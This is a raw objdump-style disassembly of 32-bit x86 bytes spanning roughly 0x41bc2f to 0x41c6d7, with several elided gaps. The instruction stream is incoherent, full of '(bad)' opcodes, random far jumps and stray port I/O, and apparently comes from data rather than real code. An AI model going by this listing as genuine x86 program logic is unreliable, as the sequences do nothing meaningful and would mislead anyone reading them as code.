  41bc2f:	pop    esi
  41bc30:	or     bh,dh
  41bc32:	and    DWORD PTR [eax+ebx*4+0x7d],esp
  41bc36:	or     DWORD PTR [edx],edi
  41bc38:	and    dh,BYTE PTR [esi-0x5c51d3c1]
  41bc3e:	push   esp
  41bc3f:	sbb    edi,DWORD PTR ds:0x5209ca19
  41bc45:	xchg   ebx,eax
  41bc46:	rcr    BYTE PTR [esp+edx*4+0x4f013c1e],cl
  41bc4d:	inc    esp
  41bc4e:	ss aas 
  41bc50:	mov    al,0x24
  41bc52:	mov    ecx,0x19f2bfed
  41bc57:	int    0x80
  41bc59:	sbb    BYTE PTR [edi+edi*8],ah
  41bc5c:	cmc    
  41bc5d:	dec    ebp
  41bc5e:	nop
  41bc5f:	repnz cmp BYTE PTR [edi+0x77949749],dh
  41bc66:	mov    eax,0x61d042fd
  41bc6b:	outs   dx,BYTE PTR ds:[esi]
  41bc6c:	into   
  41bc6d:	pusha  
  41bc6e:	sbb    eax,0xb3257762
  41bc73:	jecxz  0x41bc30
  41bc75:	cli    
  41bc76:	or     ch,BYTE PTR [edi-0x5]
  41bc79:	jmp    0x7901:0xd2b40390
  41bc80:	xor    al,0x25
  41bc82:	popf   
  41bc83:	das    
  41bc84:	lods   al,BYTE PTR ds:[esi]
  41bc85:	sbb    eax,0xbcfcd6cc
  41bc8a:	mov    cl,0xdc
  41bc8c:	jl     0x41bc47
  41bc8e:	and    al,BYTE PTR [edx+0x1d7c0f7e]
  41bc94:	and    DWORD PTR [edx-0x42c52ca],esp
  41bc9a:	mov    bh,0xbe
  41bc9c:	loopne 0x41bc26
  41bc9e:	lock and DWORD PTR [edx+0x36302742],ecx
  41bca5:	enter  0x5341,0x82
  41bca9:	jns    0x41bc56
  41bcab:	clc    
  41bcac:	shl    DWORD PTR [esi],cl
  41bcae:	ror    BYTE PTR [esi-0x6a204632],0x88
  41bcb5:	mov    ch,BYTE PTR [ecx]
  41bcb7:	ja     0x41bd35
  41bcb9:	test   al,0x3a
  41bcbb:	pop    eax
  41bcbc:	das    
  41bcbd:	rol    DWORD PTR [ecx-0x40],0x6b
	...
  41bd31:	add    BYTE PTR [eax],al
  41bd33:	add    BYTE PTR [ebp-0x8],dl
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0x99bf1c9a
  41bd41:	rcr    DWORD PTR [edi+0x13],1
  41bd44:	pop    esi
  41bd45:	sub    al,0x1
  41bd47:	add    ch,dh
  41bd49:	add    BYTE PTR [eax],al
  41bd4b:	add    bh,dh
  41bd4d:	add    edi,DWORD PTR ds:0xc80e48ae
  41bd53:	mov    cl,0x8f
  41bd55:	xchg   edx,eax
  41bd56:	enter  0xcffb,0xc5
  41bd5a:	and    BYTE PTR [ebx],dl
  41bd5c:	xor    esp,edx
  41bd5e:	(bad)  
  41bd5f:	jp     0x41bd9a
  41bd61:	sub    edi,ebx
  41bd63:	aaa    
  41bd64:	and    dl,dh
  41bd66:	in     eax,0x14
  41bd68:	(bad)  
  41bd69:	int    0x2d
  41bd6b:	loope  0x41bde5
  41bd6d:	pushf  
  41bd6e:	push   ebp
  41bd6f:	das    
  41bd70:	push   edx
  41bd71:	pop    eax
  41bd72:	mov    DWORD PTR [ecx+0xf],ecx
  41bd75:	pop    edx
  41bd76:	loopne 0x41bd99
  41bd78:	xchg   edx,eax
  41bd79:	addr16 inc edx
  41bd7b:	scas   eax,DWORD PTR es:[edi]
  41bd7c:	jge    0x41bd6a
  41bd7e:	mov    bl,0x36
  41bd80:	test   DWORD PTR [ecx+0x23],eax
  41bd83:	ja     0x41bd08
  41bd85:	lahf   
  41bd86:	mov    esp,0xf71d380e
  41bd8b:	(bad)  
  41bd8c:	fisubr DWORD PTR [ebp+esi*2-0x9]
  41bd90:	mov    DWORD PTR [ecx+0x59243af3],ebx
  41bd96:	or     DWORD PTR ds:0xe616760d,ecx
  41bd9c:	cmp    eax,0x3bb5fa44
  41bda1:	cmp    DWORD PTR [edi+0x664599ba],edi
  41bda7:	jg     0x41bd90
  41bda9:	fs std 
  41bdab:	add    ecx,DWORD PTR [edi]
  41bdad:	jno    0x41bdab
  41bdaf:	int3   
  41bdb0:	add    al,0xa7
  41bdb2:	dec    ebx
  41bdb3:	push   esi
  41bdb4:	add    dh,bh
  41bdb6:	nop
  41bdb7:	(bad)  
  41bdb8:	xor    al,0x73
  41bdba:	mov    WORD PTR [eax],?
  41bdbc:	aam    0x70
  41bdbe:	mov    esi,0x67295f8d
  41bdc3:	push   es
  41bdc4:	stos   BYTE PTR es:[edi],al
  41bdc5:	xchg   BYTE PTR [ebx-0x42],dh
  41bdc8:	mov    edx,0x40820c62
  41bdcd:	inc    ebx
  41bdce:	mov    al,ds:0xc8e3a46f
  41bdd3:	or     eax,0xb125c897
  41bdd8:	in     eax,dx
  41bdd9:	iret   
  41bdda:	cmp    BYTE PTR [ebp-0x12],ah
  41bddd:	mov    eax,0xfa4ba401
  41bde2:	int3   
  41bde3:	call   0x5316:0xcc7f08b6
  41bdea:	daa    
  41bdeb:	jmp    DWORD PTR [ecx+0x556bdafa]
  41bdf1:	xchg   esi,eax
  41bdf2:	aad    0x72
  41bdf4:	mov    cl,0x1f
  41bdf6:	xchg   edi,eax
  41bdf7:	sub    ecx,DWORD PTR [ecx]
  41bdf9:	adc    ah,al
  41bdfb:	jae    0x41bded
  41bdfd:	mov    eax,ds:0x7a462e14
  41be02:	and    cl,BYTE PTR [ebx-0x62aa356e]
  41be08:	mov    ah,bh
  41be0a:	and    esp,esp
  41be0c:	and    al,0x54
  41be0e:	xchg   edi,eax
  41be0f:	dec    ebp
  41be10:	pop    ss
  41be11:	retf   
  41be12:	sbb    eax,0xfeb553fa
  41be17:	mov    edi,0x2621f273
  41be1c:	push   esp
  41be1d:	les    ecx,FWORD PTR [edi+0x48]
  41be20:	retf   0x4686
  41be23:	cmp    bl,BYTE PTR [edx-0x12]
  41be26:	and    esp,eax
  41be28:	xchg   dx,ax
  41be2a:	sti    
  41be2b:	arpl   WORD PTR [ebx+0x1bd94590],si
  41be31:	(bad)  
  41be32:	cmc    
  41be33:	mov    ebp,0x114b01c3
  41be38:	mov    ah,0xb1
  41be3a:	out    0x1a,al
  41be3c:	mov    dh,0x83
  41be3e:	adc    edi,eax
  41be40:	jnp    0x41be42
	...
  41beb2:	add    BYTE PTR [eax],al
  41beb4:	(bad)  
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	psubsb mm1,QWORD PTR [edi+0x3d]
  41bec3:	(bad)  
  41bec4:	push   ebx
  41bec5:	sub    eax,0xf50001
  41beca:	add    BYTE PTR [eax],al
  41becc:	(bad)  
  41bece:	and    al,0x5e
  41bed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bed1:	mov    BYTE PTR ds:0x963d7525,ah
  41bed7:	je     0x41beeb
  41bed9:	mov    cl,0x10
  41bedb:	xchg   edi,eax
  41bedc:	(bad)  
  41bede:	ins    DWORD PTR es:[edi],dx
  41bedf:	sub    edi,esp
  41bee1:	mov    esi,0xd04823a0
  41bee6:	jmp    0x41bed3
  41bee8:	cmp    bl,BYTE PTR [eax+edx*8-0x50]
  41beec:	cdq    
  41beed:	nop
  41beee:	push   ecx
  41beef:	lds    ecx,FWORD PTR [ebx+0x44496036]
  41bef5:	push   0xffffffd3
  41bef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bef8:	add    ebx,DWORD PTR [ebp-0x65817e88]
  41befe:	or     ebp,DWORD PTR [ecx]
  41bf00:	pop    ebp
  41bf01:	mov    esi,0x5d2649d3
  41bf06:	mov    DWORD PTR [eax-0x4cf75896],esp
  41bf0c:	ret    0xc3fa
  41bf0f:	sub    bh,BYTE PTR [ecx-0x4]
  41bf12:	sbb    eax,DWORD PTR [esi+0xc4b6b21]
  41bf18:	mov    BYTE PTR [eax+ebx*4],bh
  41bf1b:	or     al,0x44
  41bf1d:	test   BYTE PTR [esi],bh
  41bf1f:	xchg   esp,eax
  41bf20:	inc    ebx
  41bf21:	push   ecx
  41bf22:	sub    al,0x4f
  41bf24:	jne    0x41bf2d
  41bf26:	inc    ebx
  41bf27:	xchg   DWORD PTR [edi-0x10],eax
  41bf2a:	out    0xa2,al
  41bf2c:	mov    eax,0xee8cd01a
  41bf31:	mov    esp,0xa9ef4d0d
  41bf36:	push   0x41bb793d
  41bf3b:	sbb    DWORD PTR [edi+eiz*8+0x11],esp
  41bf3f:	(bad)  
  41bf40:	out    dx,eax
  41bf41:	push   eax
  41bf42:	cmp    al,0xea
  41bf44:	sub    BYTE PTR [edi],bh
  41bf46:	(bad)  
  41bf47:	jmp    0x41bef5
  41bf49:	add    DWORD PTR ds:0xf8449a5d,edx
  41bf4f:	mov    BYTE PTR [edx+eiz*4],al
  41bf52:	sbb    eax,0x34080abf
  41bf57:	mov    eax,ds:0x9aaa4bdc
  41bf5c:	sub    eax,0x50f86d4e
  41bf61:	dec    ebp
  41bf62:	fucom  st(0)
  41bf64:	and    ebp,0x915bb4b4
  41bf6a:	pop    esi
  41bf6b:	pop    ss
  41bf6c:	mov    DWORD PTR [ecx+0x5],ecx
  41bf6f:	adc    al,0xfc
  41bf71:	fidivr DWORD PTR [ecx]
  41bf73:	add    al,0xd2
  41bf75:	push   es
  41bf76:	std    
  41bf77:	stos   DWORD PTR es:[edi],eax
  41bf78:	aam    0x25
  41bf7a:	pop    gs
  41bf7c:	push   cs
  41bf7d:	shl    DWORD PTR [edx],1
  41bf7f:	cld    
  41bf80:	pop    eax
  41bf81:	add    DWORD PTR [ebp+0x0],ebp
  41bf84:	xchg   ebp,eax
  41bf85:	pop    es
  41bf86:	inc    esi
  41bf87:	test   al,0x7a
  41bf89:	or     BYTE PTR [edx+ebx*1-0x57],0x7f
  41bf8e:	mov    esp,0x68fd38fa
  41bf93:	sbb    DWORD PTR [edx+0x29],edx
  41bf96:	sbb    esi,DWORD PTR [edx]
  41bf98:	mov    bl,0x11
  41bf9a:	rcl    DWORD PTR [eax],1
  41bf9c:	jo     0x41bf46
  41bf9e:	(bad)  
  41bf9f:	and    edx,DWORD PTR [esi]
  41bfa1:	push   ebx
  41bfa2:	outs   dx,DWORD PTR ds:[esi]
  41bfa3:	sbb    DWORD PTR [ecx+0x28],ebx
  41bfa6:	sub    eax,0xdbecaf98
  41bfab:	cdq    
  41bfac:	ficomp DWORD PTR [edi-0x12]
  41bfaf:	retf   0xa1a
  41bfb2:	pop    edx
  41bfb3:	dec    ebp
  41bfb4:	xchg   esp,eax
  41bfb5:	adc    ah,BYTE PTR [eax+0x10b9ac88]
  41bfbb:	in     eax,dx
  41bfbc:	fs add dh,ch
  41bfbf:	jo     0x41c01c
	...
  41c031:	add    BYTE PTR [eax],al
  41c033:	add    dh,al
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi+0x6bbb9a81]
  41c041:	(bad)  
  41c042:	repz add ecx,DWORD PTR [eax+0x2e]
  41c046:	add    DWORD PTR [eax],eax
  41c048:	cmc    
  41c049:	add    BYTE PTR [eax],al
  41c04b:	add    al,dl
  41c04d:	call   0x2370416a
  41c052:	(bad)  
  41c054:	test   BYTE PTR [esi],ah
  41c056:	sub    eax,0xc6dcda9c
  41c05b:	pop    ds
  41c05c:	enter  0x27e9,0xa2
  41c060:	sub    al,0xa9
  41c062:	ja     0x41c00e
  41c064:	jo     0x41c0bb
  41c066:	xchg   DWORD PTR [edi-0x3a],ebp
  41c069:	test   DWORD PTR [ebp-0x70],edi
  41c06c:	sub    cl,ch
  41c06e:	aad    0x3d
  41c070:	pop    es
  41c071:	gs push cs
  41c073:	retf   0xd98f
  41c076:	sub    eax,DWORD PTR [edi-0xf2438ca]
  41c07c:	push   edx
  41c07d:	xchg   edi,eax
  41c07e:	and    eax,0xe2044e62
  41c083:	clc    
  41c084:	inc    ebp
  41c085:	push   ss
  41c086:	popa   
  41c087:	loope  0x41c03b
  41c089:	imul   ebp,eax,0xefd24c76
  41c08f:	sbb    dl,BYTE PTR [esp+ecx*2+0xb]
  41c093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c094:	aas    
  41c095:	and    bl,0xd5
  41c098:	fiadd  WORD PTR [esp+eiz*4+0x2846f9dd]
  41c09f:	pop    ss
  41c0a0:	rcl    DWORD PTR ds:[esi+0x1a31c1cf],0x41
  41c0a8:	ins    DWORD PTR es:[edi],dx
  41c0a9:	fdivr  st,st(6)
  41c0ab:	push   esi
  41c0ac:	and    eax,0x67137624
  41c0b1:	gs dec ebp
  41c0b3:	rcl    DWORD PTR [eax],0x22
  41c0b6:	mov    edi,0xf40d5472
  41c0bb:	loop   0x41c0cf
  41c0bd:	pop    edx
  41c0be:	cmp    al,0x61
  41c0c0:	call   0x96d264cc
  41c0c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0c6:	fisttp QWORD PTR [edx-0x3a]
  41c0c9:	in     al,0x3a
  41c0cb:	arpl   WORD PTR [edi+0x7b],ax
  41c0ce:	das    
  41c0cf:	mov    ah,0x2b
  41c0d1:	and    BYTE PTR [edi],ch
  41c0d3:	shl    BYTE PTR [edi+0x2e207ab6],cl
  41c0d9:	pusha  
  41c0da:	mov    cl,0x4e
  41c0dc:	jno    0x41c074
  41c0de:	adc    al,0xc2
  41c0e0:	fmul   DWORD PTR [ebx-0x19bbc668]
  41c0e6:	cmp    al,0x98
  41c0e8:	dec    esi
  41c0e9:	fidiv  WORD PTR [ebx-0x1f]
  41c0ec:	add    al,0xdd
  41c0ee:	xchg   ebp,eax
  41c0ef:	xchg   edi,eax
  41c0f0:	in     eax,dx
  41c0f1:	or     DWORD PTR [edx],0x1d
  41c0f4:	xchg   esp,eax
  41c0f5:	add    al,0x1d
  41c0f7:	ss add eax,0xbc9dfc50
  41c0fd:	aaa    
  41c0fe:	mov    eax,DWORD PTR ds:[edi]
  41c101:	sbb    al,0x29
  41c103:	inc    ecx
  41c104:	adc    edi,0x56
  41c107:	or     esi,edi
  41c109:	or     eax,ebx
  41c10b:	push   es
  41c10c:	xlat   BYTE PTR ds:[ebx]
  41c10d:	mov    ecx,0xd714360f
  41c112:	mov    ds:0x52274610,eax
  41c117:	add    DWORD PTR [ecx-0x7480e568],ebx
  41c11d:	jl     0x41c116
  41c11f:	bound  eax,QWORD PTR [ecx-0x43]
  41c122:	popa   
  41c123:	mov    esi,0xf9d8943f
  41c128:	js     0x41c114
  41c12a:	mov    dh,0xd1
  41c12c:	(bad)  
  41c12d:	out    dx,al
  41c12e:	xor    dl,BYTE PTR [eax+0x7eade429]
  41c134:	pop    ss
  41c135:	jmp    FWORD PTR [esi*8+0x7aab6565]
  41c13c:	cdq    
  41c13d:	cli    
  41c13e:	mov    al,ds:0x8577
	...
  41c1b3:	add    BYTE PTR [esi+0x6be069a5],cl
  41c1b9:	in     al,dx
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x7f718ce0
  41c1c4:	cmp    eax,0xf500012f
  41c1c9:	add    BYTE PTR [eax],al
  41c1cb:	add    BYTE PTR [eax+0x6b227de5],dh
  41c1d1:	fidivr DWORD PTR [ebp-0x1]
  41c1d4:	in     al,dx
  41c1d5:	jno    0x41c209
  41c1d7:	inc    esp
  41c1d8:	push   ebx
  41c1d9:	(bad)  
  41c1da:	loop   0x41c1e5
  41c1dc:	mov    dh,dh
  41c1de:	retf   0xdb4d
  41c1e1:	shl    BYTE PTR [ebx+0x4e8d2a6e],0x55
  41c1e8:	fnsave [ebp-0x74]
  41c1eb:	addr16 cli 
  41c1ed:	cld    
  41c1ee:	xchg   ecx,eax
  41c1ef:	retf   0x64ad
  41c1f2:	cmp    al,0x4c
  41c1f4:	sub    dl,dl
  41c1f6:	or     dh,BYTE PTR [edx+0x5151e1]
  41c1fc:	clc    
  41c1fd:	mov    ds:0x1fda31ac,eax
  41c202:	fstp   st(1)
  41c204:	mov    al,bl
  41c206:	inc    esi
  41c207:	sub    al,0xc9
  41c209:	(bad)  
  41c20a:	iret   
  41c20b:	or     al,0x74
  41c20d:	push   0x9
  41c20f:	shl    BYTE PTR [bx+di],0xa3
  41c213:	mov    eax,ds:0xee5ab96d
  41c218:	adc    al,0x1a
  41c21a:	mov    ch,0xc3
  41c21c:	sub    eax,0x5e9ddacd
  41c221:	popf   
  41c222:	pop    ds
  41c223:	mov    esp,0xf9ce66e5
  41c228:	pushf  
  41c229:	push   esi
  41c22a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c22b:	popf   
  41c22c:	push   ebx
  41c22d:	push   ebx
  41c22e:	scas   al,BYTE PTR es:[edi]
  41c22f:	fadd   st(4),st
  41c231:	out    dx,al
  41c232:	mov    al,ds:0x6e26b714
  41c237:	push   eax
  41c238:	popa   
  41c239:	inc    edi
  41c23a:	cdq    
  41c23b:	add    ah,dl
  41c23d:	cmp    eax,0x7716e277
  41c242:	imul   esi,DWORD PTR [eax-0x31],0xf
  41c246:	sub    DWORD PTR [ecx+0x54a4be52],0x2063dad0
  41c250:	clc    
  41c251:	test   al,0x71
  41c253:	addr16 stc 
  41c255:	(bad)  
  41c256:	dec    ecx
  41c257:	ss xor al,0x64
  41c25a:	push   esi
  41c25b:	int3   
  41c25c:	icebp  
  41c25d:	mov    WORD PTR [edi+0x3d],fs
  41c260:	mov    dl,0x71
  41c262:	sbb    ebp,DWORD PTR [eax]
  41c264:	pop    ebp
  41c265:	fiadd  DWORD PTR [eax-0x46ae2693]
  41c26b:	xchg   BYTE PTR [edx+0x14],ch
  41c26e:	in     al,0x53
  41c270:	mov    bh,0x98
  41c272:	adc    al,BYTE PTR [ebx]
  41c274:	mov    eax,ds:0x48da763f
  41c279:	enter  0x341e,0x81
  41c27d:	les    ebx,FWORD PTR [eax-0x31]
  41c280:	(bad)  
  41c282:	ja     0x41c2ff
  41c284:	add    al,ch
  41c286:	xchg   esp,eax
  41c287:	xchg   BYTE PTR [edi],ah
  41c289:	and    eax,0x92af7c28
  41c28e:	mov    esp,DWORD PTR [ebp-0x5f]
  41c291:	and    ch,BYTE PTR [eax+edx*4+0x30]
  41c295:	adc    edi,esp
  41c297:	mov    esi,0xcce82bc5
  41c29c:	(bad)  
  41c29d:	cdq    
  41c29e:	ret    
  41c29f:	and    dh,0xd3
  41c2a2:	inc    edx
  41c2a3:	cmp    ah,BYTE PTR [ebx-0x232a36c2]
  41c2a9:	jbe    0x41c2c8
  41c2ab:	xor    ch,BYTE PTR [eax+0x54]
  41c2ae:	push   ds
  41c2af:	adc    ch,bl
  41c2b1:	imul   eax,DWORD PTR [eax],0xffffffd7
  41c2b4:	setb   BYTE PTR [edi]
  41c2b7:	in     eax,0x1b
  41c2b9:	loop   0x41c293
  41c2bb:	pop    eax
  41c2bc:	(bad)  
  41c2bd:	scas   al,BYTE PTR es:[edi]
  41c2be:	bnd jp 0x41c25e
	...
  41c331:	add    BYTE PTR [eax],al
  41c333:	add    BYTE PTR [eax+0xd],cl
  41c336:	sbb    eax,0xfebb5dab
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	mov    dl,0x81
  41c342:	and    BYTE PTR [edi+0x32],ah
  41c345:	xor    BYTE PTR [ecx],al
  41c347:	add    ch,dh
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [eax-0x8607163],bh
  41c351:	(bad)  
  41c352:	push   eax
  41c353:	loop   0x41c31c
  41c355:	cmp    eax,0xdd9cb5e2
  41c35a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c35b:	fisubr DWORD PTR ds:0x22413c79
  41c361:	push   ds
  41c362:	data16 jae 0x41c309
  41c365:	and    esi,DWORD PTR [ebx+0x13824d82]
  41c36b:	push   ds
  41c36c:	popf   
  41c36d:	sbb    esi,DWORD PTR [ecx-0x66098ecd]
  41c373:	xchg   ebx,eax
  41c374:	loop   0x41c3ce
  41c376:	lea    edi,[edi+ebp*8-0x7ddb2238]
  41c37d:	xchg   ecx,eax
  41c37e:	xchg   ebp,eax
  41c37f:	and    dh,ch
  41c381:	xlat   BYTE PTR ds:[ebx]
  41c382:	ret    
  41c383:	xor    edi,DWORD PTR ds:0x4109f15a
  41c389:	cmp    eax,0x258bbbea
  41c38e:	(bad)  
  41c38f:	or     eax,0xe0657948
  41c394:	pusha  
  41c395:	nop
  41c396:	loopne 0x41c40b
  41c398:	xor    BYTE PTR [ebx+0x2fbe383d],bl
  41c39e:	xchg   esi,eax
  41c39f:	adc    ecx,esp
  41c3a1:	push   ebp
  41c3a2:	dec    esp
  41c3a3:	(bad)  
  41c3a4:	xor    cl,BYTE PTR [edx-0x58]
  41c3a7:	adc    eax,0xa473956a
  41c3ac:	mov    edi,0x4132560d
  41c3b1:	fwait
  41c3b2:	pop    eax
  41c3b3:	js     0x41c3cb
  41c3b5:	mov    al,0x17
  41c3b7:	outs   dx,DWORD PTR ds:[esi]
  41c3b8:	dec    ebx
  41c3b9:	out    dx,al
  41c3ba:	mov    edx,0xc8ff5540
  41c3bf:	dec    ebp
  41c3c0:	add    ecx,DWORD PTR [ebp+0x63cf59f0]
  41c3c6:	xchg   esp,eax
  41c3c7:	shl    DWORD PTR [edi+ebx*2+0x75020706],0x33
  41c3cf:	and    DWORD PTR [edx],0xffffffe5
  41c3d2:	add    eax,0xe5f78a1d
  41c3d7:	mov    edx,ebx
  41c3d9:	adc    bl,0x9a
  41c3dc:	jp     0x41c3b2
  41c3de:	jnp    0x41c3a6
  41c3e0:	mov    esp,0x47208f7b
  41c3e5:	fbstp  TBYTE PTR [esp+ebp*4+0x67d954ac]
  41c3ec:	adc    DWORD PTR [eax],0xba9dadd3
  41c3f2:	or     edx,DWORD PTR [edi+0x7d]
  41c3f5:	outs   dx,DWORD PTR ds:[esi]
  41c3f6:	frstor [edi]
  41c3f8:	ja     0x41c3b1
  41c3fa:	ja     0x41c38c
  41c3fc:	(bad)  
  41c3fd:	fmulp  st(0),st
  41c3ff:	sub    BYTE PTR fs:[eax+0x42],bh
  41c403:	adc    ebx,DWORD PTR [edx-0x71]
  41c406:	lea    esi,[esi+0x22479a75]
  41c40c:	inc    eax
  41c40d:	fcom   st(5)
  41c40f:	mov    cl,0xf6
  41c411:	jmp    FWORD PTR [ecx]
  41c413:	mov    ebp,0x7d2dec72
  41c418:	cdq    
  41c419:	outs   dx,DWORD PTR ds:[esi]
  41c41a:	sahf   
  41c41b:	mov    eax,ds:0x22a65d70
  41c420:	cld    
  41c421:	mov    ch,0xf5
  41c423:	mov    ds:0xee01c823,al
  41c428:	test   al,0xb
  41c42a:	sub    dl,ah
  41c42c:	clc    
  41c42d:	mov    WORD PTR [edi-0x5c],es
  41c430:	loopne 0x41c43b
  41c432:	loopne 0x41c3d6
  41c434:	(bad)  
  41c435:	(bad)  
  41c436:	sub    esp,eax
  41c438:	clc    
  41c439:	test   eax,0xe61f94be
  41c43e:	lods   al,BYTE PTR ds:[esi]
  41c43f:	test   eax,0x74
	...
  41c4b4:	aam    0xec
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx-0x4337cfe]
  41c4c4:	daa    
  41c4c5:	xor    DWORD PTR [ecx],eax
  41c4c7:	add    ch,dh
  41c4c9:	add    BYTE PTR [eax],al
  41c4cb:	add    BYTE PTR [ebx-0x4afc7f1b],ch
  41c4d1:	shl    ebx,cl
  41c4d3:	mov    edi,0x557728e5
  41c4d8:	adc    BYTE PTR ds:0xc135bd96,0x80
  41c4df:	xor    ebx,eax
  41c4e1:	xchg   edi,eax
  41c4e2:	mov    edi,0x5ff3d985
  41c4e7:	icebp  
  41c4e8:	ret    
  41c4e9:	idiv   DWORD PTR [esi-0x2c]
  41c4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4ed:	dec    eax
  41c4ee:	adc    BYTE PTR [ebp+0x26b17c95],bl
  41c4f4:	out    0xa8,al
  41c4f6:	(bad)  
  41c4f7:	js     0x41c578
  41c4f9:	or     eax,0x5ebd42b8
  41c4fe:	sbb    ecx,DWORD PTR [ecx+ecx*4]
  41c501:	jmp    0xd11b:0xc9470e02
  41c508:	push   0x21
  41c50a:	cdq    
  41c50b:	mov    ds:0xad3de1f0,eax
  41c510:	jns    0x41c4a1
  41c512:	and    al,0x38
  41c514:	xor    ah,BYTE PTR [ecx+eiz*2+0x3a2882f9]
  41c51b:	gs inc ebx
  41c51d:	lds    ecx,FWORD PTR ds:0xbac4396b
  41c523:	or     bh,BYTE PTR [eax+ebx*8]
  41c526:	je     0x41c55f
  41c528:	rcl    DWORD PTR [ebx+0x6d05865b],1
  41c52e:	jmp    0x97be:0x56384f8c
  41c535:	jmp    0xff66bf8a
  41c53a:	ins    BYTE PTR es:[edi],dx
  41c53b:	jg     0x41c50a
  41c53d:	shl    BYTE PTR [esi+0x6986c6a7],0x1d
  41c544:	pop    eax
  41c545:	xor    bl,BYTE PTR [ecx]
  41c547:	jbe    0x41c589
  41c549:	push   esp
  41c54a:	sbb    eax,0xd02eafb
  41c54f:	enter  0x2679,0x7d
  41c553:	wbinvd 
  41c555:	inc    ebx
  41c556:	cmp    DWORD PTR [ebp*4+0x106afd],edx
  41c55d:	mov    ebp,esi
  41c55f:	mov    edi,0xcdd19b81
  41c564:	fwait
  41c565:	lea    edx,[ecx-0x5]
  41c568:	jmp    FWORD PTR [esi+0x6c]
  41c56b:	push   0x1ab13793
  41c570:	adc    bh,0x4d
  41c573:	mov    BYTE PTR [edx],dh
  41c575:	mov    eax,ds:0x3b29df6
  41c57a:	aaa    
  41c57b:	jne    0x41c5af
  41c57d:	mov    ebx,0x8cd8ae4f
  41c582:	(bad)  
  41c583:	jne    0x41c581
  41c585:	imul   ebp,DWORD PTR [ebp+edx*4-0x4107be60],0x55
  41c58d:	(bad)  
  41c58e:	daa    
  41c58f:	push   edx
  41c590:	fcmovbe st,st(7)
  41c592:	popf   
  41c593:	mov    bl,cl
  41c595:	dec    edi
  41c596:	push   ecx
  41c597:	addr16 pop ds
  41c599:	xor    eax,0xe97d7561
  41c59e:	and    BYTE PTR [ecx],dh
  41c5a0:	(bad)  
  41c5a1:	jb     0x41c570
  41c5a3:	mov    esi,0x6971eebc
  41c5a8:	xor    eax,0x4d42f858
  41c5ad:	mov    BYTE PTR [edi-0x9],0xa7
  41c5b1:	cmp    al,0x28
  41c5b3:	test   al,0xe0
  41c5b5:	pop    ss
  41c5b6:	pcmpeqd mm7,QWORD PTR [edi-0x3c]
  41c5ba:	mov    ebp,0x59331843
  41c5bf:	push   0xffffffcb
	...
  41c631:	add    BYTE PTR [eax],al
  41c633:	add    BYTE PTR [eax-0x2469e49d],ch
  41c639:	(bad)  
  41c63a:	lods   eax,DWORD PTR ds:[esi]
  41c63b:	jg     0x41c62c
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	mov    eax,0x1c728c91
  41c645:	xor    al,BYTE PTR [ecx]
  41c647:	add    ch,dh
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    dl,al
  41c64d:	pop    ecx
  41c64e:	sub    BYTE PTR [ecx+ebp*4+0x50],ch
  41c652:	cmp    dh,dh
  41c654:	pop    sp
  41c656:	jns    0x41c6b1
  41c658:	in     eax,0xa6
  41c65a:	jb     0x41c60c
  41c65c:	sub    eax,0x9828dbf8
  41c661:	rol    esp,0xc9
  41c664:	jl     0x41c687
  41c666:	jno    0x41c6e1
  41c668:	ins    DWORD PTR es:[edi],dx
  41c669:	mov    cl,0xd2
  41c66b:	out    dx,eax
  41c66c:	push   edx
  41c66d:	call   0x8ac9b69b
  41c672:	dec    esp
  41c673:	mov    ch,0xdf
  41c675:	push   0xfffffffc
  41c677:	icebp  
  41c678:	in     eax,0xfd
  41c67a:	mov    ch,BYTE PTR [edi+0x49b6d7d2]
  41c680:	fldenv [ebx-0x15]
  41c683:	jl     0x41c62e
  41c685:	xor    edx,DWORD PTR [edx+edx*1-0x17]
  41c689:	fs mov al,0x15
  41c68c:	xchg   esi,ecx
  41c68e:	mov    edx,esi
  41c690:	push   ebp
  41c691:	jmp    0x41c6a1
  41c693:	add    eax,0x625fcfcb
  41c698:	mov    edi,0x6138853
  41c69d:	cmp    eax,0xc2a1e70c
  41c6a2:	sbb    al,0xde
  41c6a4:	pop    esp
  41c6a5:	dec    edi
  41c6a6:	data16 (bad) 
  41c6a8:	xlat   BYTE PTR ds:[ebx]
  41c6a9:	(bad)  
  41c6aa:	outs   dx,BYTE PTR ds:[esi]
  41c6ab:	aam    0x23
  41c6ad:	push   esi
  41c6ae:	inc    ebp
  41c6af:	cmp    ch,cl
  41c6b1:	aas    
  41c6b2:	sbb    ebx,DWORD PTR [ebx-0x186e7f7c]
  41c6b8:	data16 aad 0x9e
  41c6bb:	out    dx,al
  41c6bc:	addr16 adc al,0xf0
  41c6bf:	and    al,0x6e
  41c6c1:	cmp    ch,dl
  41c6c3:	push   ecx
  41c6c4:	neg    DWORD PTR [ecx+0x78]
  41c6c7:	les    ebp,FWORD PTR [ebx-0x72cd5e0f]
  41c6cd:	push   ecx
  41c6ce:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6d0:	arpl   cx,si
  41c6d2:	add    edx,DWORD PTR [esi-0x43]
  41c6d5:	test   ecx,ecx
  41c6d7:	test   eax,0x3afebfea
